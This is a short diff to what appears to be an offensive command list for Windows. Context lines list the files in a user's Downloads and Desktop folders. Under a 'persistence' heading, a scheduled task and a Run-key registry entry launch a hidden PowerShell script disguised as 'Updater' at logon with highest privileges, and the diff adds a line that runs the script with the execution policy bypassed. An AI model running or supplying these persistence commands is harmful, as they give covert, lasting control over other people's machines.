@@ -178,6 +178,8 @@ powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Downloads\""
 powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Desktop\""
 
 ///persistence Access 
+powershell -ExecutionPolicy Bypass -File "C:\Users\Public\updater.ps1"
 schtasks /create /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\updater.ps1" /sc onlogon /rl highest
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\updater.ps1"
+
 
